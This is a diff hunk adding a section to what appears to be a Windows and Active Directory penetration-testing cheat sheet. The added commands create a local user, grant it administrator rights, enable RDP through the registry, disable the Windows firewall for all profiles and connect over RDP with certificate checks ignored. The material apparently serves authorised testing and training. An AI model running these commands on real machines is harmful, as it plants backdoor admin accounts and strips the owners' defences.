@@ -5887,6 +5887,16 @@ Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 ```
 
+Create a user when admin rights
+
+```c
+net user USERNAME PASS /add
+net localgroup administrators USERNAME /add
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f  //opens RDP
+netsh advfirewall set allprofiles state off
+xfreerdp -v:IP5 -u:USERNAME -p:'PASS' +clipboard -cert:ignore
+```
+
 ##### Enumeration using PowerView
 
 ```c
